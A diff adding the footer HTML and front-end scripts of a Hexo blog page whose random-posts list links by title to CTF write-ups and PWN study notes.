+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/05/10/%E5%85%B3%E4%BA%8E%E6%81%A2%E5%A4%8D%E7%AC%A6%E5%8F%B7%E8%A1%A8%E8%BF%99%E4%BB%B6%E4%BA%8B/" title="关于恢复符号表这件事">关于恢复符号表这件事</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/09/10/sictf-wp/" title="sictf_wp">sictf_wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2024/02/24/The-attacker-used-an-0day/" title="The attacker used an 0day">The attacker used an 0day</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2023/10/24/FSCTF-wp/" title="FSCTF_wp">FSCTF_wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Write-up/" title="分类于 Write_up">Write_up</a>
+</div>
+
+    <span><a href="/2024/02/05/hgame-week1-wp/" title="hgame-week1-wp">hgame-week1-wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/11/15/%E6%8A%80%E8%83%BD%E5%85%B4%E9%B2%81/" title="技能兴鲁">技能兴鲁</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E5%A4%8D%E7%8E%B0/" title="分类于 复现">复现</a>
+</div>
+
+    <span><a href="/2023/08/02/find-flag/" title="find_flag">find_flag</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E7%9F%A5%E8%AF%86/" title="分类于 知识">知识</a>
+</div>
+
+    <span><a href="/2023/08/09/bins/" title="bins">bins</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%84%9F%E5%8F%97/" title="分类于 感受">感受</a>
+</div>
+
+    <span><a href="/2024/06/25/2024Ciscn%E5%9B%BD%E8%B5%9B%E5%BF%83%E5%BE%97/" title="2024Ciscn国赛心得">2024Ciscn国赛心得</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/" title="分类于 PWN的学习">PWN的学习</a>
+<i class="ic i-angle-right"></i>
+<a href="/categories/PWN%E7%9A%84%E5%AD%A6%E4%B9%A0/%E6%8A%80%E5%B7%A7/" title="分类于 技巧">技巧</a>
+</div>
+
+    <span><a href="/2023/08/03/csu/" title="csu">csu</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">yhuanhuan @ yhuanhuan</span>
+  </div>
+  <div class="count">
+    <span class="post-meta-item-icon">
+      <i class="ic i-chart-area"></i>
+    </span>
+    <span title="站点总字数">253k 字</span>
+
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="ic i-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:50</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2024/06/28/protocol学习/',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"bottom","width":150,"height":300,"hOffset":-15,"vOffset":-15},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body>
+</html>
